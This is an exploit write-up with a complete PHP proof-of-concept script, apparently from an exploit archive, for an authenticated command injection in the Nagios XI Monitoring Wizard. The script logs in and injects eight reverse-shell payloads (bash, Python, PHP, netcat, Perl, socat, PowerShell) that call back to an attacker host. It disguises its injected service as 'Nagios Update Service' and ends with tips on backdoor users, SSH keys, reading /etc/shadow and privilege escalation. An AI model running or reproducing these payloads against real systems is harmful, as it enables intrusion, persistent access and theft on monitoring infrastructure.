@@ -1,0 +1,500 @@
+=============================================================================================================================================
+| # Title     : Nagios XI Monitoring Wizard Command Injection Remote Code Execution                                                         |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://www.nagios.com/products/nagios-xi/                                                                                  |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/211694/ & CVE-2025-34227
+
+[+] Summary : Nagios XI is a widely used enterprise monitoring solution. A vulnerability exists within the Monitoring Wizard configuration page where the "database" parameter
+              is unsafely passed into backend operations.Authenticated users can exploit this to execute arbitrary system commands,allowing full Remote Shell access.
+
+[+] Vulnerability Details
+
+The vulnerable endpoint:
+
+    /config/monitoringwizard.php
+
+Parameter abused:
+
+    database = "information_schema;<command>;"
+
+No input sanitization or escaping is performed, allowing command injection.
+
+Authenticated attackers can:
+
+• Execute arbitrary system commands
+• Obtain reverse shells
+• Read/write sensitive files
+• Escalate privileges if Nagios runs with elevated permissions
+
+[+] Exploit Requirements
+
+• Valid Nagios XI user credentials
+• Access to the Monitoring Wizard
+• Vulnerable Nagios XI version
+
+[+] Exploit (PHP)
+
+The provided PoC does the following:
+
+1. Accesses the login page and retrieves the NSP token
+2. Logs in using valid credentials
+3. Accesses the Monitoring Wizard page to get a fresh NSP
+4. Generates multiple reverse shell payloads (Bash, Python, PHP, Netcat, Perl, Socat, Powershell)
+5. Injects payloads through the vulnerable "database" parameter
+6. Attempts to establish a reverse shell connection to the attacker
+
+Save as: poc.php
+
+Run with:
+
+    php poc.php <target-url> <username> <password> <attacker-ip> <attacker-port>
+
+Example:
+
+    php poc.php http://192.168.1.100/nagiosxi nagiosadmin pass123 192.168.1.50 4444
+
+[+] Usage Instructions
+
+1. Start a listener on your machine:
+
+    nc -lvnp 4444
+    or
+    rlwrap nc -lvnp 4444
+    or
+    socat TCP-LISTEN:4444,fork EXEC:/bin/bash
+
+2. Run the exploit script with target credentials
+3. Observe the reverse shell connection
+
+[+] Impact
+
+Successful exploitation allows attackers to:
+
+• Execute arbitrary commands as Nagios user
+• Access system files (/etc/passwd, /etc/shadow)
+• Establish persistent access
+• Move laterally within monitored infrastructure
+
+[+] Recommendations
+
+• Apply Nagios XI security patches
+• Restrict access to the Monitoring Wizard
+• Monitor outgoing connections for anomalies
+• Harden web application configurations
+• Audit all services added in the Monitoring Wizard
+
+======================================================================
+
+[+]  POC : 
+
+<?php
+
+// استخدام البرنامج
+// php poc.php <target-url> <username> <password> <attacker-ip> <attacker-port>
+// مثال: php poc.php http://192.168.1.100/nagiosxi nagiosadmin password123 192.168.1.50 4444
+
+if ($argc < 6) {
+    echo "=====================================================\n";
+    echo "Nagios XI Reverse Shell Exploit by indoushka\n";
+    echo "=====================================================\n";
+    echo "Usage: php " . $argv[0] . " <target-url> <username> <password> <attacker-ip> <attacker-port>\n\n";
+    echo "Examples:\n";
+    echo "  php " . $argv[0] . " http://192.168.1.100/nagiosxi nagiosadmin password123 192.168.1.50 4444\n";
+    echo "  php " . $argv[0] . " https://vulnerable-nagios.local/nagiosxi admin admin123 10.0.0.5 9001\n\n";
+    echo "Note: Start listener first: nc -lvnp 4444\n";
+    echo "=====================================================\n";
+    exit(1);
+}
+
+// تعيين بيانات الإدخال
+$target_url = rtrim($argv[1], '/');
+$username = $argv[2];
+$password = $argv[3];
+$attacker_ip = $argv[4];
+$attacker_port = (int)$argv[5];
+
+// تعريف الثوابت
+define('SERVICE_NAME', 'Nagios Update Service');
+define('LOGIN_ENDPOINT', '/login.php');
+define('CONFIGWIZARD_ENDPOINT', '/config/monitoringwizard.php');
+define('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+
+// دالة للطباعة الملونة
+function print_status($message, $type = 'info') {
+    $colors = [
+        'success' => "\033[32m",  // أخضر
+        'error' => "\033[31m",    // أحمر
+        'warning' => "\033[33m",  // أصفر
+        'info' => "\033[34m",     // أزرق
+        'step' => "\033[36m",     // سماوي
+    ];
+    
+    $reset = "\033[0m";
+    $symbols = [
+        'success' => '[✓]',
+        'error' => '[✗]',
+        'warning' => '[!]',
+        'info' => '[i]',
+        'step' => '[→]'
+    ];
+    
+    echo $colors[$type] . $symbols[$type] . " " . $message . $reset . "\n";
+}
+
+// دالة لاستخراج nsp_str
+function get_nsp_str($html) {
+    $pattern = '/var\s+nsp_str\s*=\s*"([a-f0-9]+)"/';
+    if (preg_match($pattern, $html, $matches)) {
+        return $matches[1];
+    }
+    return null;
+}
+
+// دالة لاستخراج token من الصفحة
+function get_token($html) {
+    $pattern = '/<input[^>]*name="token"[^>]*value="([^"]+)"/';
+    if (preg_match($pattern, $html, $matches)) {
+        return $matches[1];
+    }
+    return null;
+}
+
+// دالة لإنشاء payloadات مختلفة للreverse shell
+function generate_reverse_shell_payloads($ip, $port) {
+    $payloads = [];
+    
+    // 1. Bash Reverse Shell (الأكثر شيوعاً)
+    $payloads['bash'] = "bash -i >& /dev/tcp/{$ip}/{$port} 0>&1";
+    
+    // 2. Python Reverse Shell
+    $payloads['python'] = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{$ip}\",{$port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'";
+    
+    // 3. PHP Reverse Shell
+    $payloads['php'] = "php -r '\$sock=fsockopen(\"{$ip}\",{$port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
+    
+    // 4. Netcat Traditional
+    $payloads['nc_trad'] = "nc -e /bin/sh {$ip} {$port}";
+    
+    // 5. Netcat OpenBSD
+    $payloads['nc_openbsd'] = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {$ip} {$port} >/tmp/f";
+    
+    // 6. Perl Reverse Shell
+    $payloads['perl'] = "perl -e 'use Socket;\$i=\"{$ip}\";\$p={$port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
+    
+    // 7. Socat (إذا كان مثبتاً)
+    $payloads['socat'] = "socat TCP:{$ip}:{$port} EXEC:/bin/sh";
+    
+    // 8. Powershell (لأنظمة Windows إذا كان Nagios يعمل على Windows)
+    $payloads['powershell'] = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$client = New-Object System.Net.Sockets.TCPClient('{$ip}',{$port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"";
+    
+    return $payloads;
+}
+
+// دالة لاختبار الاتصال بعد تنفيذ shell
+function test_shell_connection($ip, $port, $timeout = 5) {
+    $socket = @fsockopen($ip, $port, $errno, $errstr, $timeout);
+    if ($socket) {
+        fclose($socket);
+        return true;
+    }
+    return false;
+}
+
+// دالة رئيسية لتنفيذ الهجوم
+function exploit_nagios($target_url, $username, $password, $attacker_ip, $attacker_port) {
+    
+    print_status("=====================================================", 'info');
+    print_status("Starting Nagios XI Reverse Shell Exploit", 'info');
+    print_status("Target: " . $target_url, 'info');
+    print_status("Attacker: " . $attacker_ip . ":" . $attacker_port, 'info');
+    print_status("=====================================================\n", 'info');
+    
+    // إنشاء جلسة cURL
+    $ch = curl_init();
+    
+    // إعدادات أساسية
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_USERAGENT, USER_AGENT);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+    
+    // ملف الكوكيز
+    $cookie_file = tempnam(sys_get_temp_dir(), 'nagios_cookie_');
+    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
+    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
+    
+    // Proxy للتصحيح (قم بإلغاء التعليق عند الحاجة)
+    // curl_setopt($ch, CURLOPT_PROXY, 'http://127.0.0.1:8080');
+    // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+    
+    print_status("Step 1: Accessing login page...", 'step');
+    
+    // الحصول على صفحة تسجيل الدخول
+    $login_url = $target_url . LOGIN_ENDPOINT;
+    curl_setopt($ch, CURLOPT_URL, $login_url);
+    curl_setopt($ch, CURLOPT_HTTPGET, true);
+    
+    $login_page = curl_exec($ch);
+    
+    if (curl_errno($ch)) {
+        print_status("Failed to access login page: " . curl_error($ch), 'error');
+        return false;
+    }
+    
+    // استخراج nsp
+    $nsp_token = get_nsp_str($login_page);
+    if (!$nsp_token) {
+        // محاولة نمط آخر
+        $nsp_token = get_token($login_page);
+    }
+    
+    if (!$nsp_token) {
+        print_status("Could not extract NSP token from login page", 'error');
+        return false;
+    }
+    
+    print_status("NSP Token extracted: " . substr($nsp_token, 0, 10) . "...", 'success');
+    
+    print_status("\nStep 2: Attempting login...", 'step');
+    
+    // بيانات تسجيل الدخول
+    $login_data = http_build_query([
+        'nsp' => $nsp_token,
+        'page' => 'auth',
+        'pageopt' => 'login',
+        'username' => $username,
+        'password' => $password,
+        'loginButton' => ''
+    ]);
+    
+    curl_setopt($ch, CURLOPT_URL, $login_url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $login_data);
+    
+    $login_response = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    
+    // التحقق من نجاح تسجيل الدخول
+    $effective_url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
+    if (strpos($effective_url, 'index.php') === false && $http_code != 302) {
+        print_status("Login failed! Check credentials", 'error');
+        return false;
+    }
+    
+    print_status("Login successful!", 'success');
+    
+    print_status("\nStep 3: Accessing configuration wizard...", 'step');
+    
+    // الوصول إلى صفحة configuration wizard
+    $wizard_url = $target_url . CONFIGWIZARD_ENDPOINT;
+    curl_setopt($ch, CURLOPT_URL, $wizard_url);
+    curl_setopt($ch, CURLOPT_HTTPGET, true);
+    
+    $wizard_page = curl_exec($ch);
+    
+    if (curl_errno($ch)) {
+        print_status("Failed to access wizard: " . curl_error($ch), 'error');
+        return false;
+    }
+    
+    // استخراج nsp جديد
+    $wizard_nsp = get_nsp_str($wizard_page);
+    if (!$wizard_nsp) {
+        $wizard_nsp = get_token($wizard_page);
+    }
+    
+    if (!$wizard_nsp) {
+        print_status("Could not extract NSP token from wizard page", 'warning');
+        // محاولة الاستمرار مع nsp القديم
+        $wizard_nsp = $nsp_token;
+    } else {
+        print_status("New NSP Token extracted", 'success');
+    }
+    
+    print_status("\nStep 4: Generating reverse shell payloads...", 'step');
+    
+    // إنشاء payloadات مختلفة
+    $payloads = generate_reverse_shell_payloads($attacker_ip, $attacker_port);
+    
+    // اختبار payloadات بالترتيب
+    $successful_payloads = [];
+    
+    foreach ($payloads as $name => $payload) {
+        print_status("Testing payload: " . $name, 'info');
+        
+        // بناء payload للهجوم
+        $exploit_payload = http_build_query([
+            "update" => 1,
+            "nsp" => $wizard_nsp,
+            "step" => 3,
+            "nextstep" => 5,
+            "wizard" => "mysqlquery",
+            "tpl" => '',
+            "hostname" => "localhost",
+            "operation" => '',
+            "selectedhostconfig" => '',
+            "services_serial" => '',
+            "serviceargs_serial" => '',
+            "config_serial" => '',
+            "ip_address" => "127.0.0.1",
+            "port" => 3306,
+            "username" => "nagios",
+            "password" => "nagios",
+            "database" => "nagios; " . $payload . "; -- ",
+            "queryname" => SERVICE_NAME . " - " . $name,
+            "query" => "SELECT 'shell_test'",
+            "warning" => 10,
+            "check_interval" => 1,
+            "retry_interval" => 1,
+            "critical" => 20,
+            "finishButton" => "Finish"
+        ]);
+        
+        print_status("Executing payload: " . $name, 'info');
+        
+        // إرسال payload
+        curl_setopt($ch, CURLOPT_URL, $wizard_url);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $exploit_payload);
+        
+        $exploit_response = curl_exec($ch);
+        $exploit_http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        
+        // انتظار قليلاً لتنفيذ shell
+        sleep(2);
+        
+        // اختبار إذا كان shell نشط
+        if (test_shell_connection($attacker_ip, $attacker_port, 3)) {
+            print_status("SUCCESS! Reverse shell established using " . $name . " payload!", 'success');
+            $successful_payloads[] = $name;
+            
+            // يمكن إيقاف الاختبار هنا إذا أردنا أول shell ناجح
+            // break;
+        } else {
+            print_status("Payload " . $name . " failed or shell not established", 'warning');
+        }
+        
+        // تأخير بين المحاولات
+        sleep(1);
+    }
+    
+    print_status("\nStep 5: Cleanup and final results...", 'step');
+    
+    if (!empty($successful_payloads)) {
+        print_status("=====================================================", 'success');
+        print_status("EXPLOIT SUCCESSFUL!", 'success');
+        print_status("The following payloads worked:", 'success');
+        foreach ($successful_payloads as $payload) {
+            print_status("  - " . $payload, 'success');
+        }
+        print_status("\nYou should now have a reverse shell connection!", 'success');
+        print_status("Attacker: " . $attacker_ip . ":" . $attacker_port, 'success');
+        print_status("=====================================================", 'success');
+        
+        // نصائح إضافية
+        print_status("\n[!] IMPORTANT NOTES:", 'warning');
+        print_status("1. Keep your listener running: nc -lvnp " . $attacker_port, 'info');
+        print_status("2. The service will appear in Nagios dashboard as: " . SERVICE_NAME, 'info');
+        print_status("3. Manual cleanup required after exploitation:", 'warning');
+        print_status("   - Remove the service from Nagios dashboard", 'warning');
+        print_status("   - Kill any remaining processes", 'warning');
+        
+        // محاولة تنفيذ أمر لاختبار shell
+        print_status("\n[!] Testing shell with simple command...", 'info');
+        print_status("If you have a listener, try sending: whoami; id; pwd", 'info');
+        
+    } else {
+        print_status("=====================================================", 'error');
+        print_status("EXPLOIT UNSUCCESSFUL", 'error');
+        print_status("Possible reasons:", 'error');
+        print_status("1. Firewall blocking outgoing connections", 'info');
+        print_status("2. Target system missing required tools (bash, python, etc.)", 'info');
+        print_status("3. Command injection filtered or blocked", 'info');
+        print_status("4. Nagios running in restricted environment", 'info');
+        print_status("=====================================================", 'error');
+        
+        // اقتراحات للتصحيح
+        print_status("\n[!] TROUBLESHOOTING TIPS:", 'warning');
+        print_status("1. Try different payload types", 'info');
+        print_status("2. Check if outbound connections are allowed from target", 'info');
+        print_status("3. Verify listener is running and not blocked by firewall", 'info');
+        print_status("4. Try using different ports (80, 443, 53)", 'info');
+    }
+    
+    // تنظيف
+    curl_close($ch);
+    if (file_exists($cookie_file)) {
+        unlink($cookie_file);
+    }
+    
+    return !empty($successful_payloads);
+}
+
+// دالة لتشغيل listener تلقائياً (اختياري)
+function start_listener_hint($ip, $port) {
+    print_status("\n[!] LISTENER SETUP INSTRUCTIONS:", 'info');
+    print_status("Open a new terminal and run one of these commands:", 'info');
+    print_status("Netcat: nc -lvnp " . $port, 'info');
+    print_status("rlwrap Netcat (for better shell): rlwrap nc -lvnp " . $port, 'info');
+    print_status("Socat: socat TCP-LISTEN:" . $port . ",reuseaddr,fork EXEC:/bin/bash", 'info');
+    print_status("\nWaiting 10 seconds before starting exploit...", 'info');
+    sleep(10);
+}
+
+// ==============================
+// التنفيذ الرئيسي
+// ==============================
+
+// إظهار banner
+echo "\n";
+print_status("=====================================================", 'info');
+print_status("NAGIOS XI REVERSE SHELL EXPLOIT", 'info');
+print_status("CVE: Multiple (Command Injection in Monitoring Wizard)", 'info');
+print_status("                      by indoushka                    ", 'info');
+print_status("=====================================================\n", 'info');
+
+// نصائح قبل البدء
+print_status("[!] PREREQUISITES:", 'warning');
+print_status("1. Make sure you have a listener running on " . $attacker_ip . ":" . $attacker_port, 'info');
+print_status("2. Valid Nagios XI credentials required", 'info');
+print_status("3. Target must be vulnerable to command injection", 'info');
+
+echo "\n";
+print_status("Starting exploit in 5 seconds...", 'info');
+print_status("Press Ctrl+C to cancel", 'warning');
+sleep(5);
+
+// بدء الهجوم
+$result = exploit_nagios($target_url, $username, $password, $attacker_ip, $attacker_port);
+
+// نتيجة نهائية
+echo "\n";
+if ($result) {
+    print_status("Exploitation completed successfully!", 'success');
+    print_status("Check your listener for reverse shell connection", 'success');
+} else {
+    print_status("Exploitation failed. Review the errors above.", 'error');
+}
+
+// نصائح إضافية للاستغلال المتقدم
+echo "\n";
+print_status("[+] ADVANCED EXPLOITATION TIPS:", 'info');
+print_status("1. For persistent access, add SSH key or create backdoor user", 'info');
+print_status("2. Use encryption: socat with SSL or cryptcat", 'info');
+print_status("3. Upgrade shell: python -c 'import pty; pty.spawn(\"/bin/bash\")'", 'info');
+print_status("4. Check for sensitive files: /etc/passwd, /etc/shadow, nagios configs", 'info');
+print_status("5. Look for other Nagios vulnerabilities for privilege escalation", 'info');
+
+exit($result ? 0 : 1);
+
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
